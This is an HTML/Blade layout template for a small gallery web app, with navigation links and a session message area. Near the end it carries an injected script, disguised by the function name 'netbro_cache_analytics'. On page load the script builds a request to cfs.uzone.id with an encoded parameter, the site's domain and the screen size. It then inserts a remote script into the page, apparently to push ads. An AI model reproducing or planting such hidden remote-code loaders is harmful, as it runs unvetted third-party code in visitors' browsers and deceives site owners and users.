<!doctype html>
<html class="no-js" lang="en">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Gallery | Welcome</title>
    <link rel="stylesheet" href="/css/foundation.css">
    <link rel="stylesheet" href="/css/app.css">
</head>

<body>
    <div class="off-canvas-wrapper">
        <div class="off-canvas-wrapper-inner" data-off-canvas-wrapper>
            <div class="off-canvas position-left reveal-for-large" id="my-info" data-off-canvas data-position="left">
                <div class="row column">
                    <br>
                    <img class="thumbnail" src="http://placehold.it/550x350">
                    <ul class="menu vertical">
                          <li><a href="/">Home</a></li>
                          <li><a href="/login">Login</a></li>
                          <li><a href="/register">Register</a></li>
                          <li><a href="/gallery/create">Create Gallery</a></li>
                    </ul>
                </div>
            </div>
            <div class="off-canvas-content" data-off-canvas-content>
                <div class="title-bar hide-for-large">
                    <div class="title-bar-left">
                        <button class="menu-icon" type="button" data-open="my-info"></button>
                        <span class="title-bar-title">Mike Mikerson</span>
                    </div>
                </div>

                @if(Session::has('message'))
                    <div data-alert class="alert-box success radius">
                          {{Session::get('message')}}
                    </div>
                @endif

                @yield('content')

                <hr>

            </div>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
    <script src="/js/vendor/foundation.js"></script>
    <script src="/js/app.js"></script>
    <script>
        $(document).foundation();
    </script>
    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "cfs.uzone.id/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnHHqJJC7MrnEbS7YEHEWCEoWpCY2XGSgK4ZWd1729wbKkVlZ44dN8rdiMiztWxipqsvLeSWH%2flYkcGSefzJ5xklE1QPlf0%2fk7ZwCT9uh5gcf71tBeeyH1%2f9qFWedKJT9baCKIFetUxk499ic%2bpxLl6f39otE%2bcuHUhFMPpGhlUnt56U27ALyOszMYkLxvDoTH%2bUFHPNJbg5l6gTRxbfByJiHrB7kj4kwhaqd0eMiqPqOxT80Bro1zJu9Y6ZMUpEDFTBsIRZUzio7f4EoXE4WZ813vzOI8gPPema0f1I9wRuo92fRsSu8F%2bj8VTDI18W5G3IMwuH8P%2fOBThyN2c7lmSabpCjMkJyU3fkUa4%2b51D9NvqNBDKnjRBnU%2b53zsqTYkSFKkGy0aVG7DGFX%2fmdHC4cMWWAVzu4BDNc%2f3kI%2bOFfCraa0o6myir9DYCiE7i%2bJKeCTN%2fecQ%2bsZ9CEFuuQR0ze9niKgHJVTPcxV7jmPYUKoQ5l7L%2b0n0Crrl6Zq4%2fXOBDsCGuWZUFN3ZkIQ%2fM1ITg6kgC%2f%2bz6Zumn%2fPwjjbefaR0xmUCBIhfGYzf19uTeePUbRMC6xJvjrKTK%2fasjufImQ%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };
    </script>
</body>

</html>
